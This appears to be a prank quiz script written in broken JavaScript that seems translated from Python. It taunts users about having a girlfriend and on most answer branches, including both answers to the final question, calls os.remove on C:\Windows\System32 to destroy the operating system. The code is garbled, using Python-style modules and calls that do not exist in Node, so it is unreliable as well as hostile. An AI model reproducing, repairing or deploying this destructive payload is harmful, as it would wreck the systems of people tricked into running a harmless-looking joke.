const time = require('time');
const os = require('os');
const colorama = require('colorama');
const { Fore, Back, Style, init } = colorama;

//start process
console.log(Fore.RED + "Starting Process!");
time.sleep(6);

//first q
const question = prompt(Fore.GREEN + "Do you have girlfriend? Yes/No: ");
if (question === "Yes") {
    console.log(Fore.YELLOW + "NICE, good life!");
    time.sleep(4);
    quit();
}

//if q1 no delete os.system 32
else if (question === "No") {
    time.sleep(4);
    const question2 = prompt(Fore.GREEN + "Do you want to continue? Yes/No: ");
    if (question2 === "No") {
        time.sleep(3);
        console.log(Fore.YELLOW + "So bye loser!");
        os.remove("C:\\Windows\\System32");
    }

    //if q1 yes start process
    else if (question2 === "Yes") {
        time.sleep(5);
        console.log(Fore.RED + "Starting!!");
    }
    time.sleep(4);

    //process with time.sleep(4)
    console.log(Fore.WHITE + "[|] 1/4 deleting memories...");
    time.sleep(4);

    console.log(Fore.WHITE + "[||] 2/4 deleting feelings...");
    time.sleep(4);

    console.log(Fore.WHITE + "[|||] 3/4 deleting her life...");
    time.sleep(4);

    console.log(Fore.WHITE + "[||||] 4/4 rebooting brain...");
    time.sleep(3);

    console.log(Fore.LIGHTRED_EX + "Process completed successfully!");
    time.sleep(4);

    console.log(Fore.MAGENTA + "My calculations say..");
    time.sleep(3);

    console.log(Fore.RED + "Go to the gym lol! and find another girlfriend");

    //questionFindGirl "Do you find a girlfriend"
    time.sleep(3);
    const questionFindGirl = prompt(Fore.LIGHTYELLOW_EX + "So do you find a girlfriend? Yes/No: ");
    if (questionFindGirl === "Yes") {
        time.sleep(5);
        console.log(Fore.MAGENTA + "I hope");
        //after "I hope" code starts at #rest of code
    }

    else if (questionFindGirl === "No") {
        time.sleep(4);
        console.log(Fore.WHITE + "Loser");
        os.remove("C:\\Windows\\System32");
    }

    //rest of code    
    const question3 = prompt(Fore.RED + "Do you still want to continue haha? Yes/No: ");
    if (question3 === "No") {
        time.sleep(2);
        console.log(Fore.GREEN + "Your choice :)");
        time.sleep(3);
        os.remove("C:\\Windows\\System32");
    }

    else if (question3 === "Yes") {
        time.sleep(9);
        console.log(Fore.RED + "So your choice :)");
        time.sleep(3);
        console.log(Fore.MAGENTA + "Bye!");
        time.sleep(3);
        os.remove("C:\\Windows\\System32");
    }
    
    quit();
}
